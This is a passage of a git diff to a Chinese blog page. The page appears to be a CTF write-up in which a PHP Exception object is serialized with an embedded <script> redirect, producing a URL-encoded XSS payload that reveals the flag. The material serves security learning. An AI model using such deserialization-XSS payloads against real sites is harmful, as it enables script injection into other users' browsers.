class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre></div>
+
+<p>提交可以发现弹出了提示，说明构造成功了</p>
+<p><img src="https://i.loli.net/2020/12/30/cjvt9y5SOMnENHG.png" srcset="/img/loading.gif" alt="image-20201230095717756"></p>
+<p>但是并没有出现flag</p>
+<p><strong>结合题目提示构造xss</strong></p>
+<div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php">$a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">"&lt;script&gt;window.location.href='https://www.baidu.com'&lt;/script&gt;"</span>);</span>
+<span class="php"><span class="hljs-keyword">echo</span> urlencode(serialize($a));</span></code></pre></div>
+
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs angelscript">O%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A61%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ewindow.location.href%<span class="hljs-number">3</span>D%<span class="hljs-number">27</span>https%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fwww.baidu.com%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00f</span>ile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A43%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>CphpStudy%<span class="hljs-number">5</span>CPHPTutorial%<span class="hljs-number">5</span>CWWW%<span class="hljs-number">5</span>Ctest%<span class="hljs-number">5</span>Ccumt11.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre></div>
+
+<p>提交后就在响应头中出现flag</p>
+<p><img src="https://i.loli.net/2020/12/30/dyxvkoh4HuJ7gQI.png" srcset="/img/loading.gif" alt="image-20201230100514805"></p>
 
             </div>
             <hr>
@@ -1262,6 +1277,29 @@ $c = <span class="hljs-keyword">new</span> HelloPhp;
               
                 <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/08/buuoj-upload/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buuctf-upload</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/05/buuoj/">
+                        <span class="hidden-mobile">buuctf-sql注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
               
             </div>
 
